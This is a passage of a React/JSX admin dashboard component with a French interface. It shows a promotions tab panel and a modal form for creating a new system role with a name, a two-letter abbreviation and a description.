      {/* Promotions & Marketing Tab Panel */}
      {activeSubTab === "promotions" && (
        <div className="space-y-6 animate-in fade-in duration-300">
          <AdminPromotionPanel lang={lang} adminName={adminName} />
        </div>
      )}

      {/* Role Creation Modal */}
      {showRoleModal && (
        <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-[100] flex items-center justify-center p-4">
          <div className="bg-white rounded-3xl w-full max-w-md overflow-hidden shadow-2xl relative animate-in fade-in zoom-in-95 duration-200">
            <div className="bg-purple-900 p-5 flex items-center justify-between text-white border-b border-purple-800">
              <h3 className="font-black flex items-center gap-2">
                <Plus className="w-5 h-5 text-purple-300" />
                Nouveau Rôle Système
              </h3>
              <button 
                onClick={() => setShowRoleModal(false)}
                className="p-1 hover:bg-purple-800 rounded-lg transition-colors cursor-pointer"
              >
                <X className="w-5 h-5 opacity-70 hover:opacity-100" />
              </button>
            </div>
            
            <div className="p-6 space-y-4 font-sans text-left">
              <div>
                <label className="block text-[11px] font-bold text-slate-500 uppercase tracking-widest mb-1.5">Nom du Rôle</label>
                <input 
                  type="text" 
                  value={newRoleName}
                  onChange={(e) => setNewRoleName(e.target.value)}
                  className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-sm font-bold text-slate-800 focus:outline-none focus:ring-2 focus:ring-purple-600 focus:bg-white transition-all shadow-sm"
                  placeholder="Ex: Auditeur Outil"
                />
              </div>

              <div>
                <label className="block text-[11px] font-bold text-slate-500 uppercase tracking-widest mb-1.5">Initiale / Abréviation (2 lettres)</label>
                <input 
                  type="text" 
                  maxLength={2}
                  value={newRoleAbbr}
                  onChange={(e) => setNewRoleAbbr(e.target.value.toUpperCase())}
                  className="w-24 bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-sm font-black text-slate-800 text-center uppercase focus:outline-none focus:ring-2 focus:ring-purple-600 focus:bg-white transition-all shadow-sm"
                  placeholder="AO"
                />
              </div>

              <div>
                <label className="block text-[11px] font-bold text-slate-500 uppercase tracking-widest mb-1.5">Description (Optionnelle)</label>
                <textarea 
                  rows={2}
                  value={newRoleDesc}
                  onChange={(e) => setNewRoleDesc(e.target.value)}
                  className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-xs text-slate-700 focus:outline-none focus:ring-2 focus:ring-purple-600 focus:bg-white transition-all shadow-sm"
                  placeholder="Description des privilèges de ce rôle..."
                />
              </div>

              <div className="pt-2">
                <button
                  type="button"
                  onClick={() => {
                    if (!newRoleName || !newRoleAbbr) {
                      alert("Veuillez remplir le nom et l'abréviation du rôle.");
                      return;
                    }
                    const newRole = {
                      id: newRoleAbbr.toLowerCase(),
                      abbr: newRoleAbbr,
                      name: newRoleName,
                      desc: newRoleDesc || "Nouveau rôle personnalisé",
                      color: "blue"
                    };
                    setSystemRoles([...systemRoles, newRole]);
                    setSelectedRole(newRole.id);
                    setShowRoleModal(false);
                    setNewRoleName("");
                    setNewRoleAbbr("");
                    setNewRoleDesc("");
                    alert(`Le rôle ${newRole.name} a été créé avec succès. Vous pouvez maintenant définir ses permissions.`);
                  }}
                  className="w-full bg-purple-600 font-bold text-white py-3 rounded-xl shadow-md hover:bg-purple-700 hover:shadow-lg transition-all text-sm uppercase tracking-wider"
                >
                  Ajouter le Rôle
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
